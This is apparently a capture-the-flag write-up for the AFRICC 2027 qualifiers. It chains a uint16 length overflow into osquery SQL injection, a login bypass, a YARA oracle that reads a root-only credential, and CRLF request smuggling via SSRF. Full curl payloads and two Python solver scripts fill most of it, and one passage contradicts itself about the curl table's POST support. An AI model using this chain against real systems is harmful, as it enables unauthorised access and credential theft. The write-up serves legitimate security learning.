+++
title = "Tired of Running | AFRICC 2027 Qualifiers CTF"
date = "2026-08-09"
tags = ["CTF", "Web", "CRLF", "Smuggling"]
description = "Full chain walkthrough: uint16 length overflow to smuggle osquery SQL fields, login bypass, a YARA oracle for byte-by-byte credential exfiltration, and CRLF request smuggling to POST the credential to an internal flag server."
difficulty = 'hard'
draft = true
+++

> How a uint16 integer overflow let me smuggle SQL fields into osquery, exfiltrate a 64-byte credential through a YARA oracle, and reach an internal flag server with a CRLF-smuggled POST.

Hey Everyone, this week I have participated in **Africa CTF qualifiers 2027**. The competition was individual with 11 categories, and alhamdullah, I ranked 17th among 250 players and achieved one of the top performances in the web category.

This writeup is a walkthrough for the most exciting and unique challenge in the whole CTF, prepared by my bro Mohamed Wagdy aka kalawy in the scene. Let's goooo

The challenge gives us a small Go webapp at `https://605893355ff7.labs.ctfroom.com` and a `Player.zip` with the full source of two Go services (`app` and `flagserver`). The end goal is to make the app POST the content of `/opt/vault/credentials.dat` to the internal `flagserver:5001`, which returns the flag.

# Recon - Reading the Source

1. The first thing that stands out in `app/main.go` is a hand-rolled serialization scheme:
```go
func serializeBuffer(f1, f2, f3 []byte) []byte {
	var buf bytes.Buffer

	packField := func(data []byte) {
		length := uint16(len(data)) // length capped at 16-bit
		binary.Write(&buf, binary.BigEndian, length) // 2 bytes, big-endian
		buf.Write(data) // then the raw bytes
	}

	packField(f1)
	packField(f2)
	packField(f3)

	return buf.Bytes()
}
```

**What each piece means**
- `2-byte length`: uint16 is a 16-bit unsigned integer = exactly 2 bytes. So the max length that can be stored is 65535.
- `big-endian`: the order the two bytes are written. `binary.BigEndian` writes the most-significant byte first. The value 5 becomes bytes 00 05 (not 05 00).
  If it were `little-endian` it'd be 05 00. Same uint16, different byte order — the deserializer must match or everything misaligns.

`buf.Write(data)` --> This line creates a real bug. Why? Because the data should be stored with max length `uint16` which means `65535` and this happens with this function `binary.Write(&buf, binary.BigEndian, length)`, but after that `buf.Write(data)` stores all data causing an **`integer overflow`** bug.

**For example:** if field 1 is `65537` bytes, the stored length wraps to 1 (65537 mod 65536), however all `65537` bytes land in the buffer. The reader then thinks field 1 is 1 byte, reads the next 2 bytes of our data as field 2's length, and so on — writer and reader no longer agree on the frame boundaries, which is exactly how we smuggle parameter/table values into fields the server intended to hardcode.

2. The backend query is built with raw `fmt.Sprintf` and only the *value* is quote-filtered:

```go
valueStr := string(valueBytes)

if strings.Contains(valueStr, "'") {
	http.Error(w, "no SQLi", http.StatusBadRequest)
	return
}

var query string
if string(table) == "users" {
	query = fmt.Sprintf(
		"SELECT * FROM %s WHERE %s='%s' and directory like '/home/%%';",
		table, parameter, valueStr,
	)
} else {
	query = fmt.Sprintf(
		"SELECT * FROM %s WHERE %s='%s';",
		table, parameter, valueStr,
	)
}

out, err = exec.Command(
	"osqueryi", "--json",
	"--enable_tables="+strings.Join(allowedTables, ","),
	query,
).Output()
```

- `parameter` and `table` are never validated, and the value goes inside single quotes without escaping. The allowed tables list is the interesting part:
```go
var allowedTables = []string{
	"users",
	"file",
	"curl",
	"yara",
	"interface_addresses",
	"etc_hosts",
}
```
So the backend runs **osquery** — the endpoint is `POST /query` on the internal `127.0.0.1:5000` service, reachable from the front app on port `8000`.

### What is OSquery ?
`osquery` turns the OS into a SQL queryable database. Instead of shelling out to `cat`, `ls`, `ps`, etc.
You write SELECT queries against tables that represent OS data:
- `file` → file metadata (size, permissions, type) for any path
- `users` → local user accounts
- `etc_hosts / interface_addresses ` → DNS hosts file / network interfaces
- `curl` → make HTTP requests from the host
- `yara` → scan file content against YARA signature rules

In this challenge there is no separate backend container. `app/main.go` starts two HTTP servers inside the same process/container `(app/main.go)`:
```go
queryMux.HandleFunc("/query", queryHandler) // listens 127.0.0.1:5000
frontMux.HandleFunc("/filesMetadata", metadataHandler)  // listens :8000 (public)
```

- We can't reach `/query` by POSTing requests to it, it's internal, you only talk to it from the frontend `8000` port.
- `queryHandler` builds the SQL string from your smuggled fields and runs it through `osqueryi --json` via `exec.Command`.
- It parses the JSON rows and echoes key: value back.

So **the backend runs osquery** means: the only thing between your input and a real SQL engine on the host is that `fmt.Sprintf` string. There's no database — osquery itself is the database. That's why the SQLi gives you arbitrary reads of the filesystem (file), file content (yara), and even network requests from inside the container (curl).

3. If the query returns any rows and the table is `users`, the app prints `OK` and issues a session cookie — we don't need a real password. Just make the query return a row.

# Building the Smuggling Payload

The front `loginHandler` posts `Handle` from the login form into the backend:
```go
username := r.Form.Get("Handle")
serialized := serializeBuffer([]byte(username), []byte("username"), []byte("users"))
resp, err := http.PostForm(backendURL(), map[string][]string{
	"serialized": {string(serialized)},
})
```

So field 1 is the username (user-controlled, and it's the **value** that gets quote-checked), field 2 is the hardcoded `username`, field 3 is the hardcoded `users`.

We want to control field 2 (parameter) and field 3 (table).
- The truncation trick: give field 1 a big value so the `uint16` length wraps. With `len(f1) = 65537`, the stored length is `1` (65537 mod 65536). The deserializer then:
1. Reads field 1 as length `1` → takes 1 byte (the first byte of our blob).
2. Reads field 2's length from the **rest of data**, which we control.
3. Reads field 3's length from whatever follows.

So if we put the handler value to `blabla`, the SQL query will be like:
```sql
SELECT * FROM users WHERE 1=1--'blabla' and directory like '/home/%';
```
The `--` comments out the rest, the login check just needs the query to return a row.

# Login Bypass

I built a small curl request and POSTed it:
```bash
 curl -i -s -X POST 'https://605893355ff7.labs.ctfroom.com/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary "Handle=x%00%061%3D1--%20%00%05users$(printf 'A%.0s' {1..65521})"
```
 **Payload Explanation:**
 - `x`: just 1 filler byte. It becomes the value the server checks for quotes. We keep it innocent so the filter passes.
- `%00%06`: these 2 bytes say the next section is 6 bytes long. The server believes it.
- `1%3D1--`: (that's 1=1-- + a space) — the actual attack: always true SQL. The -- comments out everything after it.
- `%00%05`:  2 bytes saying the next section is 5 bytes long.
- `users`: the table name we want to query.
- `$(printf 'A%.0s' {1..65521})`: 65521 copies of the letter A. Pure padding, just filler to make the username huge.

After sending this we got a session, and we should keep it because this is how we send our requests later.

**We are logged in.** And here's the important part: `/filesMetadata` takes a `q` parameter, serializes it into the `file` table query:
```go
filename := r.Form.Get("q")
serialized := serializeBuffer([]byte(filename), []byte("path"), []byte("file"))
```

Our mission now is to get the content of the credentials file `/opt/vault/credentials.dat`, as it appears in the code:
```go
const credentialPath = "/opt/vault/credentials.dat"
```

We will trick this endpoint with the same smuggling way we used in the login step:
```bash
curl -i -s -X POST 'https://605893355ff7.labs.ctfroom.com/filesMetadata' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'session=ecf7b6f34b303ec0259cc1c5ce01650f89891a1b7eb99fdfadcc36afb9751f11' \
  --data-binary "q=x%00%23path='/opt/vault/credentials.dat'--%00%04file$(printf 'A%.0s' {1..65493})"
```

We got these details about the cred file: size **64** bytes → matches `entrypoint.sh`, mode **0400** → we can't read it as a normal query result, but the app runs as root, so osquery itself can read it.
So the next step is to extract the credentials byte by byte (Oracle) then send it to get the flag from the remote server.

# YARA Oracle for the Credential

I'm not familiar with Yara rules so I asked AI to figure them out for me, and learned that:
`path` --> the file to scan
`sigrule`	--> the YARA rule string to test against
`sigfile / sig_group` --> alternative ways to load rules from files/groups (we don't need them)
`strings`	--> which defined strings matched
`matches`	--> which rules matched (our oracle output)
`count`	--> how many matches (our oracle output)

In our case we need the `sigrule` rule to make conditions like "if the first char == a return 1 else return 0" and so on, for example:
```
rule r {                // rule named "r"
    strings:
        $a = { 61 }     // byte pattern: hex 0x61 = ASCII 'a'
    condition:
        $a at 0         // true if that byte sits at offset 0
}
```

I asked a model to create a script to retrieve the credentials, this script automates the steps from login bypass until getting the credentials:
```
import re
import struct
import sys
import time
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()

BASE = "https://605893355ff7.labs.ctfroom.com"
CRED = "/opt/vault/credentials.dat"
ALPHABET = "0123456789abcdef"


def pack_field(data: bytes) -> bytes:
    return struct.pack(">H", len(data)) + data


def build_payload(parameter: bytes, table: bytes, value_len: int = 1) -> bytes:
    value = b"V" * value_len
    body = value + pack_field(parameter) + pack_field(table)
    total = 65536 + value_len
    body += b"A" * (total - len(body))
    return body


def login(s):
    payload = build_payload(b"1=1--", b"users")
    r = s.post(f"{BASE}/login", data={"Handle": payload}, allow_redirects=False, timeout=20)
    assert r.status_code == 302, f"login failed: {r.status_code} {r.text}"
    return r.cookies.get("session")


def post(s, parameter: bytes, table: bytes) -> str:
    payload = build_payload(parameter, table)
    for _ in range(3):
        try:
            r = s.post(f"{BASE}/filesMetadata", data={"q": payload},
                       allow_redirects=False, timeout=(5, 30))
            return r.text
        except requests.exceptions.RequestException:
            time.sleep(1)
    return ""


def rule(offset: int, char: str) -> str:
    return f"rule r{offset:02x}{char} {{ strings: $a = {{ {ord(char):02x} }} condition: $a at {offset} }}"


def parse_all(body: str):
    found = {}
    for m in re.finditer(r"\br([0-9a-f]{2})([0-9a-f])\b", body):
        found[int(m.group(1), 16)] = m.group(2)
    return found


def strategy_all_in_one(s):
    rules = "\n".join(rule(i, c) for i in range(64) for c in ALPHABET)
    param = f"path='{CRED}' AND sigrule='{rules}'--".encode()
    body = post(s, param, b"yara")
    found = parse_all(body)
    return found if len(found) == 64 else None


def strategy_per_offset(s):
    results = {}

    def run(offset):
        rules = "\n".join(rule(offset, c) for c in ALPHABET)
        param = f"path='{CRED}' AND sigrule='{rules}'--".encode()
        body = post(s, param, b"yara")
        for c in ALPHABET:
            if re.search(rf"\br{offset:02x}{c}\b", body):
                return offset, c
        return offset, None

    with ThreadPoolExecutor(max_workers=8) as ex:
        for offset, c in ex.map(run, range(64)):
            results[offset] = c
            done = sum(1 for v in results.values() if v)
            if done % 8 == 0:
                print(f"  [{done:>3}/64]", flush=True)
    return results


def main():
    s = requests.Session()
    s.verify = False
    sess = login(s)
    print(f"[+] logged in, session={sess}", flush=True)

    t0 = time.time()
    print("[*] trying all-in-one (1 request)...", flush=True)
    found = strategy_all_in_one(s)
    if found:
        cred = "".join(found[i] for i in range(64))
        print(f"[+] credential: {cred}  ({time.time()-t0:.0f}s)", flush=True)
        return

    print("[*] all-in-one failed, falling back to per-offset batch (64 requests)...", flush=True)
    found = strategy_per_offset(s)
    if len(found) != 64 or None in found.values():
        print("[!] incomplete", found, flush=True)
        sys.exit(1)
    cred = "".join(found[i] for i in range(64))
    print(f"[+] credential: {cred}  ({time.time()-t0:.0f}s)", flush=True)


if __name__ == "__main__":
    main()
```
This is an optimized version of the script, it exfiltrates in just 2s ;)

Getting the credentials:
```
credential: ecc5e8e22468c5c92728ddd62a5e3f60afe7074ece8e1f9ebaca777ef5856630
```
Then the last step is to get the flag from its server by sending the credentials via SSRF because the server is internal.

# SSRF to the Flag Server

`docker-compose.yml` puts `flagserver` on an internal network with no public exposure, but the `curl` osquery table can make arbitrary HTTP requests from inside the app container. The flag server accepts a POST whose body is the credential:
```go
func submitHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		...
	}
	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<16))
	submitted := []byte(strings.TrimSpace(string(body)))
	...
	ok, err := credentialAccepted(submitted) // POSTs to app:5002/verify
	...
	fmt.Fprintf(w, "%s\n", flag)
}
```

**Problem I hit:** The curl table has no `data` column — the request body column is `body`. Using `data` makes osquery exit with `Failed to run osqueryi: exit status 1`.
So the correct query:
```sql
SELECT * FROM curl
WHERE url='http://flagserver:5001/' AND method='POST' AND body='<64-hex-credential>'--;
```

The `result` column of the curl table holds the response body, so the response comes back as:
```txt
result: africc{...}
```

Note the chain we are implementing:
The file is 64 hex chars and we have `yara` and `curl` tables enabled. That's the whole plan:
- `yara` → read the file content byte-by-byte (oracle),
- `curl` → POST the recovered credential to the internal flag server.
- `curl` → SSRF to reach the internal flag server.

**Tip:** the curl table is GET-only as a hardcoded implementation of its design, so we can't use POST here.

## The Last Step to Get the Flag

`Flagserver` only returns the flag to a POST carrying the credential (or a GET to `/sha256(cred)` after a successful POST). The `osquery` curl table is GET-only, and nothing else in the container can POST to `flagserver`.

We should send a POST request with the recovered credentials and a GET request to get the flag at the same time, to achieve this --> **CRLF** appears.

# CRLF with Request Smuggling

The request will look like:

```
GET / HTTP/1.1\r\n
User-Agent: X\r\n
Host: flagserver:5001\r\n        <- OUR injected text
\r\n                              <- OUR injected blank line
POST / HTTP/1.1\r\n              <- OUR injected text
Host: flagserver:5001\r\n
Content-Length: 64\r\n
Connection: close\r\n
\r\n
ecc5e8e22468c5c92728ddd62a5e3f60afe7074ece8e1f9ebaca777ef5856630
\r\n
Host: flagserver:5001\r\n         <- beast's own trailing Host (garbage)
\r\n
```
### What the server sees
Go's net/http reads that byte stream and parses it top to bottom, exactly like a text parser:
- Reads GET / HTTP/1.1 → request line #1
- Reads User-Agent: X, Host: flagserver:5001 → headers
- Hits the blank line → request #1 is complete → responds 200
- Connection is still open, so it loops back and parses the remaining bytes:
- Reads POST / HTTP/1.1 → request line #2
- Reads Host, Content-Length: 64 → headers
- Reads 64 bytes as the body = the credential
- → `submitHandler` runs → verify → unlock() → `claimPath` set

So it's **not a GET and a POST in the same request**. It's two separate requests on one connection, because we planted a second request-line into what the client thought was a header value. The server parsed two requests; the client thinks it sent one.

### Why the first attempt failed
Without the injected Host: line, the stream was:
```
GET / HTTP/1.1\r\n
User-Agent: \r\n\r\nPOST / HTTP/1.1...   <- blank line appears HERE, inside UA
Host: flagserver:5001\r\n                 <- beast's Host arrives too late
```
The blank line came before beast's own Host line, so request #1 ended with no Host header → Go: 400 missing required Host header. Adding `Host: flagserver:5001` into the value moved it before the blank line, making request #1 valid — and the rest of the injected text became request #2.

# Chaining All Steps to One Solver
```python
#!/usr/bin/env python3
"""
Player | ctfroom.com — full solver.

Chain:
  1. login bypass          -> uint16 truncation -> field smuggling -> users WHERE 1=1--
  2. credential recovery   -> yara table oracle (1 request, 1024 rules)
  3. smuggled POST         -> curl table User-Agent CRLF injection -> pipelined POST
  4. claim                 -> GET /sha256(cred) -> flag
"""
import hashlib
import re
import struct
import sys
import time
import requests
import urllib3

urllib3.disable_warnings()

BASE = "https://605893355ff7.labs.ctfroom.com"
CRED_PATH = "/opt/vault/credentials.dat"
ALPHABET = "0123456789abcdef"


def pack(d: bytes) -> bytes:
    return struct.pack(">H", len(d)) + d


def build(parameter: bytes, table: bytes) -> bytes:
    value = b"V"
    body = value + pack(parameter) + pack(table)
    total = 65537
    body += b"A" * (total - len(body))
    return body


def login(s) -> str:
    payload = build(b"1=1--", b"users")
    r = s.post(f"{BASE}/login", data={"Handle": payload},
               allow_redirects=False, timeout=20)
    assert r.status_code == 302, f"login failed: {r.status_code} {r.text[:200]}"
    return r.cookies.get("session")


def query(s, parameter: bytes, table: bytes) -> str:
    payload = build(parameter, table)
    for _ in range(3):
        try:
            r = s.post(f"{BASE}/filesMetadata", data={"q": payload},
                       allow_redirects=False, timeout=(5, 30))
            return r.text
        except requests.exceptions.RequestException:
            time.sleep(1)
    return ""


def yara_rule(offset: int, char: str) -> str:
    return (f"rule r{offset:02x}{char} {{ strings: $a = {{ {ord(char):02x} }} "
            f"condition: $a at {offset} }}")


def recover_credential(s) -> str:
    rules = "\n".join(yara_rule(i, c) for i in range(64) for c in ALPHABET)
    param = f"path='{CRED_PATH}' AND sigrule='{rules}'--".encode()
    body = query(s, param, b"yara")
    found = {}
    for m in re.finditer(r"\br([0-9a-f]{2})([0-9a-f])\b", body):
        found[int(m.group(1), 16)] = m.group(2)
    if len(found) == 64:
        return "".join(found[i] for i in range(64))

    print("[!] all-in-one incomplete, falling back to per-offset...", flush=True)
    results = {}
    for off in range(64):
        for c in ALPHABET:
            param = f"path='{CRED_PATH}' AND sigrule='{yara_rule(off, c)}'--".encode()
            if re.search(rf"\br{off:02x}{c}\b", query(s, param, b"yara")):
                results[off] = c
                break
    if len(results) == 64:
        return "".join(results[i] for i in range(64))
    sys.exit(f"oracle incomplete: {results}")


def main():
    s = requests.Session()
    s.verify = False

    print("[*] 1. login bypass...", flush=True)
    sess = login(s)
    print(f"[+]    session: {sess}", flush=True)

    print("[*] 2. recovering credential via yara oracle...", flush=True)
    t0 = time.time()
    cred = recover_credential(s)
    print(f"[+]    credential: {cred}  ({time.time() - t0:.0f}s)", flush=True)
    assert len(cred) == 64 and set(cred) <= set(ALPHABET)

    claim = "/" + hashlib.sha256(cred.encode()).hexdigest()

    smuggle = (
        "X\r\n"
        "Host: flagserver:5001\r\n"
        "\r\n"
        "POST / HTTP/1.1\r\n"
        "Host: flagserver:5001\r\n"
        "Content-Length: 64\r\n"
        "Connection: close\r\n"
        "\r\n" + cred
    )
    param = f"url='http://flagserver:5001/' AND user_agent='{smuggle}'--".encode()

    print("[*] 3. smuggling POST via User-Agent CRLF...", flush=True)
    body = query(s, param, b"curl")
    print("   " + body[:140].replace("\n", " "), flush=True)

    time.sleep(1.5)

    print(f"[*] 4. claiming flag at {claim}...", flush=True)
    body = query(s, f"url='http://flagserver:5001{claim}'--".encode(), b"curl")
    print("   " + body[:300].replace("\n", " "), flush=True)

    m = re.search(r"africc\{[^}]+\}", body)
    if m:
        print(f"\n[+] FLAG: {m.group(0)}", flush=True)
    else:
        print("\n[-] flag not found; retry steps 3-4 within 2 minutes", flush=True)


if __name__ == "__main__":
    main()
```

Our Flag is: `africc{wh4t_4_gr34t_marathon}`

# Resources
- [osquery documentation](https://osquery.readthedocs.io/en/latest/)

Happy Hacking :)
